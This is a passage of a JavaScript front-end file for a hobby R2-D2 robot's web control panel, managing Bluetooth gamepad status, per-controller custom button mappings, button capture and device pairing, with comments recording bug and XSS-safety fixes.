    const au = m.audio || 'CIRCLE';
    const auv = this._btn(gp, au);
    if (auv && !prev[au])  api('/audio/random', 'POST', { category: 'happy' });
    prev[au] = auv;
  }

  // Lecture d'axe — retourne -1..1
  _axis(gp, name) {
    const axisMap = { L_STICK_X: 0, L_STICK_Y: 1, R_STICK_X: 2, R_STICK_Y: 3 };
    if (name in axisMap) return gp.axes[axisMap[name]] || 0;
    const btnMap  = { L2: 6, R2: 7 };
    if (name in btnMap) { const b = gp.buttons[btnMap[name]]; return b ? b.value : 0; }
    return 0;
  }

  // Lecture bouton — retourne bool
  _btn(gp, name) {
    const map = {
      CROSS: 0, CIRCLE: 1, SQUARE: 2, TRIANGLE: 3,
      L1: 4, R1: 5, L2: 6, R2: 7, SELECT: 8, START: 9,
      L3: 10, R3: 11, DPAD_UP: 12, DPAD_DOWN: 13, DPAD_LEFT: 14, DPAD_RIGHT: 15,
    };
    const idx = map[name];
    return (idx !== undefined && gp.buttons[idx]) ? gp.buttons[idx].pressed : false;
  }

  // ── UI ─────────────────────────────────────────────────────────
  _setUI(connected, name) {
    const icon       = document.querySelector('.gamepad-icon');
    const statusText = el('bt-status-text');
    const deviceName = el('bt-device-name');
    if (icon)       icon.classList.toggle('connected', connected);
    if (statusText) { statusText.textContent = connected ? 'CONNECTED' : 'NOT CONNECTED'; statusText.classList.toggle('connected', connected); }
    if (deviceName) deviceName.textContent = name || '—';
    this._updatePill();
  }

  _updatePill() {
    const pill  = el('ck-pill-bt');
    const label = el('ck-pill-bt-label');
    if (!pill) return;
    const enabled   = this._piEnabled;
    const connected = this._piConnected || this._connected;
    let cls, txt;
    if (!enabled) {
      cls = 'status-pill error'; txt = 'BT OFF';
    } else if (connected) {
      const weakSignal = this._rssi != null && this._rssi <= -75;
      cls = weakSignal ? 'status-pill warn' : 'status-pill ok';
      txt = (this._batteryPct > 0) ? `BT ${this._batteryPct}%` : 'BT';
      pill.title = weakSignal ? `Weak signal: ${this._rssi} dBm` : 'Bluetooth connected';
    } else {
      cls = 'status-pill'; txt = 'BT';
      pill.title = 'Bluetooth not connected';
    }
    pill.className = cls;
    if (label) label.textContent = txt;
  }

  // Appelé par le poller status — intègre statut Pi BT + Gamepad API
  updateStatus(data) {
    if (!data) return;
    this._piConnected = data.bt_connected || false;
    this._piEnabled   = data.bt_enabled !== false;  // défaut true si absent

    // Sync toggle UI
    const tog = el('bt-enable-toggle');
    if (tog) tog.checked = this._piEnabled;

    // 2026-05-16 redesign: drive the new header card via is-connected
    // class on the row (header bg accent + LED pulse + MAC pill green
    // tint all cascade from this single toggle).
    const row = document.querySelector('#spanel-bluetooth .bt-status-row');
    const gpIcon = document.querySelector('#spanel-bluetooth .gamepad-icon');
    if (this._piConnected) {
      if (row)    row.classList.add('is-connected');
      if (gpIcon) gpIcon.classList.add('connected');
      const deviceName = el('bt-device-name');
      if (deviceName && data.bt_name && data.bt_name !== '—') deviceName.textContent = data.bt_name;
      const statusText = el('bt-status-text');
      if (statusText) { statusText.textContent = 'CONNECTED via Pi'; statusText.classList.add('connected'); }
      // Show MAC so operator can tell two same-model controllers apart
      // (e.g. two NVIDIA Shields). Pill is hidden if backend couldn't
      // resolve a MAC (rare — only when both evdev.uniq AND bluetoothctl
      // fail, e.g. controller via 8BitDo USB dongle in HID mode).
      const macEl = el('bt-device-mac');
      if (macEl) {
        const mac = data.active_device_mac || '';
        macEl.textContent = mac || '';
        macEl.style.display = mac ? '' : 'none';
      }
    } else {
      if (row)    row.classList.remove('is-connected');
      if (gpIcon) gpIcon.classList.remove('connected');
      const statusText = el('bt-status-text');
      if (statusText) {
        // Only reset to NOT CONNECTED if the Web Gamepad path isn't
        // also showing something — _setUI handles its own text.
        if (!statusText.classList.contains('inactivity-paused')) {
          statusText.textContent = 'NOT CONNECTED';
        }
        statusText.classList.remove('connected');
      }
      const macEl = el('bt-device-mac');
      if (macEl) { macEl.textContent = ''; macEl.style.display = 'none'; }
    }

    // RSSI
    this._rssi = data.bt_rssi ?? null;

    // Battery
    const pct    = data.bt_battery || 0;
    this._batteryPct = pct;
    const fillEl = el('bt-battery-fill');
    const pctEl  = el('bt-battery-pct');
    if (pct > 0) {
      const bcolor = pct > 50 ? '#00cc66' : pct > 25 ? '#ff8800' : '#ff2244';
      if (fillEl) { fillEl.style.width = pct + '%'; fillEl.style.background = bcolor; }
      if (pctEl)  pctEl.textContent = pct + '%';
    } else {
      if (fillEl) fillEl.style.width = '0%';
      if (pctEl)  pctEl.textContent = '--%';
    }
    // RSSI signal strength
    const rssiEl = el('bt-rssi-val');
    if (rssiEl) {
      const rssi = data.bt_rssi;
      if (rssi !== null && rssi !== undefined) {
        const quality = rssi >= -60 ? 'excellent' : rssi >= -75 ? 'good' : rssi >= -90 ? 'fair' : 'poor';
        const color   = rssi >= -60 ? '#00cc66'   : rssi >= -75 ? '#88cc00' : rssi >= -90 ? '#ff8800' : '#ff2244';
        rssiEl.textContent = rssi + ' dBm';
        rssiEl.style.color = color;
        rssiEl.title = `Signal: ${quality}`;
      } else {
        rssiEl.textContent = '--';
        rssiEl.style.color = '#4a7a9b';
      }
    }

    // W5 fix 2026-05-16: surface inactivity pause in status text
    const stEl = el('bt-status-text');
    if (stEl && data.bt_inactivity_pause === true) {
      stEl.textContent = '⏸ PAUSED (inactivity) — press any button';
      stEl.classList.add('inactivity-paused');
    } else if (stEl) {
      stEl.classList.remove('inactivity-paused');
    }
    // W4/W11 fix 2026-05-16: bench/lock mode pills inside BT card
    const pills = el('bt-mode-pills');
    if (pills) {
      const items = [];
      if (data.vesc_bench_mode) {
        items.push('<span class="mode-pill mode-bench">🛡 BENCH MODE</span>');
      }
      if (data.lock_mode === 2) {
        items.push('<span class="mode-pill mode-lock">🔒 CHILD LOCK — drive blocked, dome free</span>');
      } else if (data.lock_mode === 1) {
        const cap = Math.round((data.kids_speed_limit || 0.5) * 100);
        items.push(`<span class="mode-pill mode-kids">👶 KIDS MODE — drive capped at ${cap}%</span>`);
      }
      if (items.length) {
        pills.innerHTML = items.join(' ');
        pills.style.display = '';
      } else {
        pills.innerHTML = '';
        pills.style.display = 'none';
      }
    }

    this._updatePill();
  }

  // Appelé par le toggle ON/OFF
  async setEnabled(enabled) {
    this._piEnabled = enabled;
    this._updatePill();
    await api('/bt/enable', 'POST', { enabled });
    toast(enabled ? 'BT controller enabled' : 'BT controller disabled', 'ok');
  }

  // Appelé au changement de type de manette
  onTypeChange(type) {
    // Mettre à jour les labels du tableau de mapping selon le type
    const labels = {
      ps:        { WEST: '□ Square',   NORTH: '△ Triangle', EAST: '○ Circle', SOUTH: '✕ Cross', TL: 'L1',  TR: 'R1',  MODE: 'PS'      },
      xbox:      { WEST: 'X',          NORTH: 'Y',          EAST: 'B',        SOUTH: 'A',       TL: 'LB',  TR: 'RB',  MODE: 'Xbox'    },
      nintendo:  { WEST: 'Y',          NORTH: 'X',          EAST: 'A',        SOUTH: 'B',       TL: 'L',   TR: 'R',   MODE: 'Home'    },
      generic:   { WEST: 'Btn 3',      NORTH: 'Btn 4',      EAST: 'Btn 2',    SOUTH: 'Btn 1',   TL: 'L1',  TR: 'R1',  MODE: 'Home'    },
    };
    const l = labels[type] || labels.generic;
    const setOpt = (id, val, text) => {
      const e = el(id); if (!e) return;
      for (const o of e.options) {
        if (o.value === val) { o.text = text; break; }
      }
    };
    // 2026-05-16: only the E-STOP dropdown remains in the legacy mapping
    // table — panel_dome/panel_body/audio rows were removed (now handled
    // via Custom Button Actions, per-MAC). setOpt is now a no-op for
    // missing elements (graceful).
    setOpt('bt-map-estop',  'BTN_MODE',   l.MODE);
  }

  // Charge la config depuis le serveur et sync l'UI
  async loadConfig() {
    const data = await api('/bt/status');
    if (!data) return;
    this.updateStatus(data);
    // gamepad type
    const typeEl = el('bt-gamepad-type');
    if (typeEl && data.bt_gamepad_type) {
      for (const o of typeEl.options) if (o.value === data.bt_gamepad_type) { o.selected = true; break; }
      this.onTypeChange(data.bt_gamepad_type);
    }
    // inactivity timeout — sync only if user is not actively editing
    if (data.bt_inactivity_timeout !== undefined) {
      const t      = data.bt_inactivity_timeout;
      const slider = el('bt-inactivity-timeout');
      const num    = el('bt-timeout-num');
      const lbl    = el('bt-timeout-val');
      const active = document.activeElement;
      if (active !== slider && active !== num) {
        if (slider) { slider.value = Math.min(600, t); syncHoloSlider(slider); }
        if (num)    num.value    = t;
        if (lbl)    lbl.textContent = t === 0 ? 'OFF' : t + 's';
      }
    }
  }

  // Sauvegarde config complète sur le serveur
  async saveFullConfig() {
    // 2026-05-16: legacy button mappings (panel_dome, panel_body, audio)
    // removed from the UI — operator now binds those via 🎯 CAPTURE NEW
    // BUTTON in CUSTOM BUTTON ACTIONS. Only axes + E-STOP remain here.
    // Backend still accepts the legacy keys for backward compat but
    // no longer dispatches them.
    const mappings = {
      throttle:   el('bt-map-throttle')?.value || 'ABS_Y',
      steer:      el('bt-map-steer')?.value    || 'ABS_X',
      dome:       el('bt-map-dome')?.value     || 'ABS_RX',
      // camera = future feature (UI placeholder, no dispatch yet).
      // '' = unmapped (allowed empty value, see _BT_MAPPING_ALLOW_EMPTY).
      camera:     el('bt-map-camera')?.value   ?? 'ABS_RY',
      estop:      el('bt-map-estop')?.value    || 'BTN_MODE',
    };
    const cfg = {
      gamepad_type:       el('bt-gamepad-type')?.value          || 'ps',
      deadzone:           (parseInt(el('bt-deadzone')?.value)    || 10) / 100,
      inactivity_timeout: parseInt(el('bt-timeout-num')?.value || el('bt-inactivity-timeout')?.value) || 30,
      mappings,
    };
    // B-94 (remaining tabs audit 2026-05-15): localStorage now mirrors
    // the ACTUAL mappings the user just configured, not a hardcoded
    // dict. Previous code overwrote with fixed PS5-default values
    // regardless of what the operator selected → Gamepad API JS path
    // diverged from BT controller path. Send to server first, then
    // mirror the same mapping object client-side.
    const r = await api('/bt/config', 'POST', cfg);
    if (r?.status === 'ok') {
      localStorage.setItem('r2d2-bt-mappings', JSON.stringify({
        ...mappings,
        deadzone: el('bt-deadzone')?.value || '10',
      }));
      toast('BT config saved', 'ok');
    } else {
      toast('Save error', 'error');
    }
  }

  _getMappings() {
    try { const s = localStorage.getItem('r2d2-bt-mappings'); return s ? JSON.parse(s) : {}; }
    catch { return {}; }
  }

  _loadMappings() {
    try {
      const m = this._getMappings();
      const sel = (id, val) => { const e = el(id); if (e && val) { for (const o of e.options) if (o.value === val) { o.selected = true; break; } } };
      sel('bt-map-throttle', m.throttle);
      sel('bt-map-steer',    m.steer);
      sel('bt-map-dome',     m.dome);
      const dz = el('bt-deadzone');
      if (dz && m.deadzone) { dz.value = m.deadzone; syncHoloSlider(dz); const dzv = el('bt-deadzone-val'); if (dzv) dzv.textContent = m.deadzone + '%'; }
    } catch { /* ignore */ }
  }

  saveMappings() { this.saveFullConfig(); }
}

const btController = new BTController();
btController._piEnabled   = true;
btController._piConnected = false;
function saveBTConfig() { btController.saveFullConfig(); }

// ================================================================
// BT Custom Button Mappings — per-controller user-defined bindings
// ================================================================
// Operator can capture any button on a paired controller and bind it
// to a Shortcuts-style action (choreo, sound, panel toggle, etc.).
// Mappings are persisted server-side per MAC (device profile) so a
// switch between paired controllers loads the right set automatically.
const _BT_ACTION_TYPES = [
  { value: 'none',                label: '— none —' },
  { value: 'arms_toggle',         label: '🦾 Arm toggle' },
  { value: 'body_panel_toggle',   label: '🚪 Body panel toggle' },
  { value: 'dome_panel_toggle',   label: '🔘 Dome panel toggle' },
  { value: 'play_choreo',         label: '🎭 Play choreo' },
  { value: 'play_sound',          label: '🎵 Play sound' },
  { value: 'play_random_audio',   label: '🎲 Play random (category)' },
  { value: 'play_animation',      label: '💡 Play lights animation' },
];

const btCustomMappings = {
  _activeMac:        null,
  _profiles:         {},
  _captureTimer:     null,
  _capturePollTimer: null,
  _scripts:          null,   // cache /choreo/list
  _sounds:           null,   // cache flat list of sounds
  _cats:             null,   // cache audio categories map

  async load() {
    const status = await api('/bt/status');
    if (!status) return;
    this._profiles  = status.device_profiles || {};
    const activeMac = status.active_device_mac || null;

    // Lazy-fetch dropdown sources (choreos + sounds + categories)
    // once per session — same pattern as shortcutsEditor.load.
    await this._loadScripts();
    await this._loadSounds();

    // Build the device selector — custom card list (replaces native
    // <select> which truncated long name+MAC). Hidden <select> stays
    // in sync for backward compat with code that reads .value.
    const sel  = el('bt-device-profile-select');
    const list = el('bt-device-profile-list');
    if (!sel || !list) return;
    const previous = sel.value;
    sel.replaceChildren();
    list.replaceChildren();

    const macs = Object.keys(this._profiles);
    if (macs.length === 0) {
      const opt = document.createElement('option');
      opt.value = '';
      opt.textContent = '— no controller paired yet —';
      sel.appendChild(opt);
      const empty = document.createElement('div');
      empty.className   = 'bt-device-empty';
      empty.textContent = '— no controller paired yet — pair one in CONTROLLER PAIRING above';
      list.appendChild(empty);
      this._activeMac = null;
    } else {
      let chosen = '';
      if (previous && this._profiles[previous]) chosen = previous;
      else if (activeMac && this._profiles[activeMac]) chosen = activeMac;
      else chosen = macs[0];

      macs.forEach(mac => {
        const prof = this._profiles[mac] || {};
        const name = prof.name || mac;
        const isConnected = mac === activeMac;
        const isSelected  = mac === chosen;
        const mappingCount = Array.isArray(prof.custom_button_mappings)
          ? prof.custom_button_mappings.length : 0;

        // Hidden <select> option (drives compat with onDeviceChange etc.)
        const opt = document.createElement('option');
        opt.value = mac;
        opt.textContent = `${name} (${mac})`;
        if (isSelected) opt.selected = true;
        sel.appendChild(opt);

        // Card
        const card = document.createElement('div');
        card.className = 'bt-device-card' +
          (isSelected ? ' selected' : '') +
          (isConnected ? ' connected' : '');
        card.dataset.mac = mac;

        const left = document.createElement('div');
        left.className = 'bt-device-card-left';

        const nameRow = document.createElement('div');
        nameRow.className   = 'bt-device-card-name';
        nameRow.textContent = name;
        left.appendChild(nameRow);

        const metaRow = document.createElement('div');
        metaRow.className = 'bt-device-card-meta';
        const macSpan = document.createElement('span');
        macSpan.className   = 'bt-device-card-mac';
        macSpan.textContent = mac;
        metaRow.appendChild(macSpan);
        const dot = document.createElement('span');
        dot.className   = 'bt-device-card-sep';
        dot.textContent = '·';
        metaRow.appendChild(dot);
        const mapSpan = document.createElement('span');
        mapSpan.className   = 'bt-device-card-mappings';
        mapSpan.textContent = `${mappingCount} mapping${mappingCount === 1 ? '' : 's'}`;
        metaRow.appendChild(mapSpan);
        left.appendChild(metaRow);

        card.appendChild(left);

        const right = document.createElement('div');
        right.className = 'bt-device-card-right';
        if (isConnected) {
          const badge = document.createElement('span');
          badge.className   = 'bt-device-badge connected';
          badge.textContent = '● CONNECTED';
          right.appendChild(badge);
        } else if (prof.last_seen) {
          const seen = document.createElement('span');
          seen.className   = 'bt-device-badge dim';
          seen.textContent = '○ offline';
          right.appendChild(seen);
        }
        card.appendChild(right);

        card.addEventListener('click', () => this.onDeviceChange(mac));
        list.appendChild(card);
      });

      sel.value = chosen;
      this._activeMac = chosen;
    }

    const delBtn = el('bt-delete-profile-btn');
    if (delBtn) delBtn.style.display = this._activeMac ? '' : 'none';

    this._render();
  },

  async _loadScripts() {
    if (this._scripts) return this._scripts;
    // Fix 2026-05-16: /choreo/list returns a TOP-LEVEL ARRAY of 49
    // entries, not {scripts:[...]} or {choreos:[...]}. The optimistic
    // .scripts || .choreos fallback always evaluated to undefined →
    // dropdown was permanently empty.
    const d = await api('/choreo/list');
    if (Array.isArray(d))       this._scripts = d;
    else if (d && Array.isArray(d.scripts))  this._scripts = d.scripts;
    else if (d && Array.isArray(d.choreos))  this._scripts = d.choreos;
    else                                     this._scripts = [];
    return this._scripts;
  },

  async _loadSounds() {
    if (this._sounds) return;
    const idx = await api('/audio/index');
    this._cats   = (idx && idx.categories) || {};
    this._sounds = Object.values(this._cats).flat();
  },

  onDeviceChange(mac) {
    this._activeMac = mac || null;
    // Sync the hidden <select> + card highlights
    const sel = el('bt-device-profile-select');
    if (sel) sel.value = this._activeMac || '';
    const list = el('bt-device-profile-list');
    if (list) {
      list.querySelectorAll('.bt-device-card').forEach(card => {
        card.classList.toggle('selected', card.dataset.mac === this._activeMac);
      });
    }
    const delBtn = el('bt-delete-profile-btn');
    if (delBtn) delBtn.style.display = this._activeMac ? '' : 'none';
    this._render();
  },

  _render() {
    const container = el('bt-custom-mappings-list');
    if (!container) return;
    container.replaceChildren();

    if (!this._activeMac) {
      const hint = document.createElement('div');
      hint.style.color    = 'var(--text-dim)';
      hint.style.fontSize = '11px';
      hint.textContent    = '— select a device to view its mappings —';
      container.appendChild(hint);
      return;
    }

    const profile = this._profiles[this._activeMac] || {};
    const list    = profile.custom_button_mappings || [];
    if (list.length === 0) {
      const hint = document.createElement('div');
      hint.style.color    = 'var(--text-dim)';
      hint.style.fontSize = '11px';
      hint.textContent    = '— no custom mappings yet — click 🎯 CAPTURE NEW BUTTON to add one —';
      container.appendChild(hint);
      return;
    }
    list.forEach(cm => container.appendChild(this._buildRow(cm)));
  },

  // XSS-safe row builder — createElement + textContent throughout.
  // Layout: [button-pill] [icon] [label-input] [type-select] [target-cell] [✕]
  _buildRow(cm) {
    const row = document.createElement('div');
    row.className = 'bt-custom-row';
    row.dataset.id = cm.id || '';

    // 1) read-only button code pill (BTN_THUMBL etc.)
    const codePill = document.createElement('code');
    codePill.className   = 'bt-btn-code-pill';
    codePill.textContent = cm.button || '?';
    codePill.title       = 'Controller button captured for this mapping';
    row.appendChild(codePill);

    // 2) action type select
    // (icon + label removed 2026-05-16 — BT mappings have no visible
    // button on the Drive UI, unlike Shortcuts; they're invisible
    // bindings between a controller key and an action.)
    const typeSel     = document.createElement('select');
    typeSel.className = 'shortcut-row-type input-text';
    _BT_ACTION_TYPES.forEach(opt => {
      const o = document.createElement('option');
      o.value = opt.value;
      o.textContent = opt.label;
      if ((cm.action?.type || 'none') === opt.value) o.selected = true;
      typeSel.appendChild(o);
    });
    typeSel.addEventListener('change', () => {
      cm.action = { type: typeSel.value, target: '' };
      // Rebuild the target cell (and persist once a valid target is picked)
      const targetCell = row.querySelector('.bt-custom-target-cell');
      if (targetCell) {
        targetCell.replaceChildren();
        targetCell.appendChild(this._buildActionTargetInput(cm, () => this._saveRow(cm, row)));
      }
      this._saveRow(cm, row);
    });
    row.appendChild(typeSel);

    // 5) target cell — dynamic per action type
    const targetCell = document.createElement('div');
    targetCell.className     = 'bt-custom-target-cell';
    targetCell.style.minWidth = '0';
    targetCell.appendChild(this._buildActionTargetInput(cm, () => this._saveRow(cm, row)));
    row.appendChild(targetCell);

    // 6) delete button
    const delBtn       = document.createElement('button');
    delBtn.className   = 'btn btn-xs';
    delBtn.textContent = '✕';
    delBtn.title       = 'Delete this mapping';
    delBtn.addEventListener('click', () => this.deleteMapping(cm.id));
    row.appendChild(delBtn);

    return row;
  },

  // Builds the right-hand "target" picker for whichever action type
  // is currently selected on this mapping. Mirrors shortcutsEditor's
  // _buildTargetInput logic. onChange fires whenever the operator
  // picks a real option so the row auto-saves.
  _buildActionTargetInput(cm, onChange) {
    const type = cm.action?.type || 'none';
    if (type === 'none') {
      const s = document.createElement('span');
      s.style.color    = 'var(--text-dim)';
      s.style.fontSize = '10px';
      s.textContent    = '—';
      return s;
    }

    const mkSelect = (options, currentValue) => {
      const sel = document.createElement('select');
      sel.className = 'shortcut-row-target input-text';
      let firstValid = '';
      options.forEach(o => {
        const opt = document.createElement('option');
        opt.value = o.value;
        opt.textContent = o.text;
        if (o.disabled) opt.disabled = true;
        if (o.value === currentValue) opt.selected = true;
        if (!firstValid && !o.disabled && o.value !== '') firstValid = o.value;
        sel.appendChild(opt);
      });
      const validMatch = currentValue !== '' && options.some(o => o.value === currentValue);
      if (!validMatch && firstValid) {
        sel.value = firstValid;
        cm.action.target = firstValid;
      }
      sel.addEventListener('change', () => {
        cm.action.target = sel.value;
        if (typeof onChange === 'function') onChange();
      });
      return sel;
    };

    if (type === 'arms_toggle') {
      const count = (typeof armsConfig !== 'undefined' && armsConfig._count) || 0;
      if (count === 0) {
        return mkSelect([{value: '', text: '(configure arms first)', disabled: true}], cm.action.target);
      }
      const options = [];
      for (let i = 1; i <= count; i++) {
        const sid = (armsConfig._servos || [])[i - 1] || '';
        const lbl = sid ? (armsConfig._labels?.[sid] || '') : '';
        const text = (lbl && lbl !== sid) ? lbl : `Arm ${i}`;
        options.push({value: String(i), text});
      }
      return mkSelect(options, cm.action.target);
    }
    if (type === 'body_panel_toggle' || type === 'dome_panel_toggle') {
      const prefix = type === 'body_panel_toggle' ? 'Servo_S' : 'Servo_M';
      const options = [{value: '', text: '(pick a servo)'}];
      const allPanels = (typeof _servoCfg !== 'undefined' && _servoCfg.panels) || {};
      const ids = Object.keys(allPanels)
        .filter(id => id.startsWith(prefix))
        .sort((a, b) => {
          const na = parseInt(a.replace(prefix, ''), 10);
          const nb = parseInt(b.replace(prefix, ''), 10);
          return (isNaN(na) ? 0 : na) - (isNaN(nb) ? 0 : nb);
        });
      ids.forEach(id => {
        const lbl = allPanels[id]?.label;
        const text = (lbl && lbl !== id) ? `${lbl} (${id})` : id;
        options.push({value: id, text});
      });
      if (ids.length === 0) {
        options.push({value: '', text: '(none configured in Calibration)', disabled: true});
      }
      return mkSelect(options, cm.action.target);
    }
    if (type === 'play_choreo') {
      const options = [{value: '', text: '(pick a choreo)'}];
      (this._scripts || []).forEach(s => {
        options.push({value: s.name, text: s.label || s.name});
      });
      return mkSelect(options, cm.action.target);
    }
    if (type === 'play_sound') {
      const options = [{value: '', text: '(pick a sound)'}];
      (this._sounds || []).forEach(s => options.push({value: s, text: s}));
      return mkSelect(options, cm.action.target);
    }
    if (type === 'play_random_audio') {
      const options = [{value: '', text: '(pick a category)'}];
      Object.keys(this._cats || {}).sort().forEach(c => options.push({value: c, text: c}));
      return mkSelect(options, cm.action.target);
    }
    if (type === 'play_animation') {
      const options = [{value: '', text: '(pick an animation)'}];
      const anims = (typeof animData !== 'undefined' && animData.animations) || [];
      anims.forEach(a => {
        const code = String(a.code ?? a.mode ?? a.id ?? '');
        const name = a.name || a.label || `T${code}`;
        if (code) options.push({value: code, text: `T${code} — ${name}`});
      });
      if (anims.length === 0) {
        options.push({value: '', text: '(visit Lights tab first)', disabled: true});
      }
      return mkSelect(options, cm.action.target);
    }
    const span = document.createElement('span');
    span.textContent = '—';
    return span;
  },

  async startCapture() {
    if (!this._activeMac) {
      toast('Connect a controller first', 'warn');
      return;
    }
    const btn = el('bt-capture-btn');
    if (btn) { btn.disabled = true; btn.textContent = '🎯 LISTENING…'; }
    const res = await apiDetail('/bt/capture/start', 'POST');
    if (!res.ok) {
      if (btn) { btn.disabled = false; btn.textContent = '🎯 CAPTURE NEW BUTTON'; }
      toast(res.error || 'capture failed', 'error');
      return;
    }
    const modal = el('bt-capture-modal');
    if (modal) modal.style.display = 'flex';
    let remaining = 10;
    const rEl = el('bt-capture-remaining');
    if (rEl) rEl.textContent = String(remaining);
    this._captureTimer = setInterval(() => {
      remaining--;
      const r = el('bt-capture-remaining');
      if (r) r.textContent = String(Math.max(0, remaining));
      if (remaining <= 0) {
        this._stopCapturePolling();
        this._closeModal();
        const btn2 = el('bt-capture-btn');
        if (btn2) { btn2.disabled = false; btn2.textContent = '🎯 CAPTURE NEW BUTTON'; }
      }
    }, 1000);
    this._capturePollTimer = setInterval(() => this._pollCapture(), 300);
  },

  async _pollCapture() {
    const res = await apiDetail('/bt/capture/poll');
    if (!res.ok) return;
    const d = res.data || {};
    if (d.state === 'captured' && d.button) {
      this._stopCapturePolling();
      this._closeModal();
      const btn = el('bt-capture-btn');
      if (btn) { btn.disabled = false; btn.textContent = '🎯 CAPTURE NEW BUTTON'; }
      toast(`Captured: ${d.button}`, 'ok');
      await this._addNewMapping(d.button);
    } else if (d.state === 'expired' || d.state === 'cancelled' || d.state === 'idle') {
      // 'idle' guards a race where the server already cleared state
      // (e.g. the operator clicked CANCEL before the poll landed).
      this._stopCapturePolling();
      this._closeModal();
      const btn = el('bt-capture-btn');
      if (btn) { btn.disabled = false; btn.textContent = '🎯 CAPTURE NEW BUTTON'; }
    }
  },

  _stopCapturePolling() {
    if (this._captureTimer)     { clearInterval(this._captureTimer);     this._captureTimer = null; }
    if (this._capturePollTimer) { clearInterval(this._capturePollTimer); this._capturePollTimer = null; }
  },

  _closeModal() {
    const modal = el('bt-capture-modal');
    if (modal) modal.style.display = 'none';
  },

  async cancelCapture() {
    await api('/bt/capture/cancel', 'POST');
    this._stopCapturePolling();
    this._closeModal();
    const btn = el('bt-capture-btn');
    if (btn) { btn.disabled = false; btn.textContent = '🎯 CAPTURE NEW BUTTON'; }
  },

  async _addNewMapping(button) {
    if (!this._activeMac) {
      toast('No active device — connect a controller first', 'warn');
      return;
    }
    const res = await apiDetail('/bt/custom_mapping', 'POST', {
      device_mac: this._activeMac,
      mapping: {
        button,
        action: { type: 'none', target: '' },
        // 2026-05-16: label + icon omitted — BT mappings have no visible
        // UI button. Backend accepts both fields as optional/empty.
      },
    });
    if (!res.ok) {
      toast(res.error || 'save failed', 'error');
      return;
    }
    await this.load();
  },

  async _saveRow(cm, row) {
    if (!this._activeMac) return;
    const res = await apiDetail('/bt/custom_mapping', 'POST', {
      device_mac: this._activeMac,
      mapping: {
        id:     cm.id || '',
        button: cm.button,
        action: cm.action || { type: 'none', target: '' },
        // 2026-05-16: label + icon omitted — no UI button on Drive tab.
      },
    });
    if (!res.ok) {
      toast(res.error || 'save failed', 'error');
      return;
    }
    // Pick up server-assigned id on first save
    const saved = res.data?.mapping || res.data;
    if (saved && saved.id && !cm.id) {
      cm.id = saved.id;
      if (row) row.dataset.id = cm.id;
    }
  },

  async deleteMapping(id) {
    if (!id) return;
    if (!confirm('Delete this mapping?')) return;
    const res = await apiDetail('/bt/custom_mapping/' + encodeURIComponent(id),
                                'DELETE', { device_mac: this._activeMac });
    if (!res.ok) { toast(res.error || 'delete failed', 'error'); return; }
    await this.load();
  },

  async deleteProfile() {
    if (!this._activeMac) return;
    const profile = this._profiles[this._activeMac] || {};
    const name = profile.name || this._activeMac;
    if (!confirm(`Delete the entire profile for "${name}"?\n\nAll custom mappings for this controller will be lost.`)) return;
    const res = await apiDetail('/bt/device_profile/' + encodeURIComponent(this._activeMac), 'DELETE');
    if (!res.ok) { toast(res.error || 'delete failed', 'error'); return; }
    toast('Profile deleted', 'ok');
    await this.load();
  },
};

// ================================================================
// BT Pairing UI
// ================================================================
const btPairing = {
  _scanTimer: null,
  _pollTimer: null,

  startScan() {
    // E12 fix 2026-05-16: clear previous timers on double-click. Was:
    // rapid SCAN clicks orphaned the prior _scanTimer/_pollTimer; only
    // the latest got cleared at 15s/16s, prior intervals fired forever
    // until tab close (~hammered /bt/scan/devices indefinitely).
    if (this._scanTimer) { clearInterval(this._scanTimer); this._scanTimer = null; }
    if (this._pollTimer) { clearInterval(this._pollTimer); this._pollTimer = null; }
    api('/bt/scan/start', 'POST').then(r => {
      if (!r) return;
      const btn = el('bt-scan-btn');
      if (btn) {
        btn.disabled = true;
        btn.classList.add('bt-scanning');
      }
      const lblEl = el('bt-scan-label');     if (lblEl) lblEl.textContent = '⏳ SCANNING…';
      const stEl  = el('bt-scan-status');    if (stEl)  stEl.textContent  = 'Scan active — 15 seconds…';
      let remaining = 15;
      this._scanTimer = setInterval(() => {
        remaining--;
        el('bt-scan-status').textContent = `Scan active — ${remaining}s remaining…`;
        if (remaining <= 0) {
          clearInterval(this._scanTimer);
          if (btn) {
            btn.disabled = false;
            btn.classList.remove('bt-scanning');
          }
          el('bt-scan-label').innerHTML = '&#x1F50D; SCAN (15s)';
          el('bt-scan-status').textContent = 'Scan complete.';
        }
      }, 1000);
      this._pollTimer = setInterval(() => this.refresh(), 2000);
      setTimeout(() => { clearInterval(this._pollTimer); this.refresh(); }, 16000);
    });
  },

  refresh() {
    api('/bt/scan/devices').then(r => {
      if (!r) return;
      this._renderDiscovered(r.discovered || []);
      this._renderPaired(r.paired || []);
    });
  },

  _renderDiscovered(list) {
    const el2 = el('bt-discovered-list');
    // E18 fix 2026-05-16: null guard — tab swap could detach the
    // container before the deferred refresh fires.
    if (!el2) return;
    if (!list.length) {
      el2.innerHTML = '<div style="color:var(--txt-dim);font-size:11px">— No devices detected —</div>';
      return;
    }
    // B-42 (audit 2026-05-15): bluetoothctl reports raw advertised BT
    // device names — an attacker in range can broadcast a name that
    // breaks out of the inline-onclick single quotes (escapeHtml
    // doesn't escape `'`). Build via createElement + dataset +
    // addEventListener so the name never reaches an HTML interpolation
    // context. address/name flow through dataset and the handler reads
    // them via target.closest().
    // WOW polish X2 2026-05-15: sort by RSSI desc + add signal bars.
    // BT discovered devices come with .rssi (dBm, negative; closer to 0
    // = stronger). Mapping to 1-4 bars uses standard rough thresholds.
    const sorted = [...list].sort((a, b) => (b.rssi ?? -100) - (a.rssi ?? -100));
    el2.replaceChildren();
    sorted.forEach(d => {
      const row = document.createElement('div');
      row.className = 'bt-pair-row';
      // Signal bars (only if RSSI is provided)
      if (typeof d.rssi === 'number') {
        const rssi = d.rssi;
        const lit = rssi >= -55 ? 4 : rssi >= -65 ? 3 : rssi >= -75 ? 2 : 1;
        const cls = rssi >= -65 ? '' : rssi >= -75 ? 'weak' : 'bad';
        const bars = document.createElement('span');
        bars.className = 'signal-bars';
        bars.title = `${rssi} dBm`;
        for (let i = 1; i <= 4; i++) {
          const b = document.createElement('span');
          b.className = `signal-bar signal-bar-${i} ${i <= lit ? 'lit ' + cls : ''}`;
          bars.appendChild(b);
        }
        row.appendChild(bars);
      }
      const nameSpan = document.createElement('span');
      nameSpan.className = 'bt-pair-name';
      nameSpan.textContent = d.name || '(unnamed device)';
      const addrSpan = document.createElement('span');
      addrSpan.className = 'bt-pair-addr';
      addrSpan.textContent = d.address || '';
      const btn = document.createElement('button');
      btn.className = 'btn btn-active btn-xs';
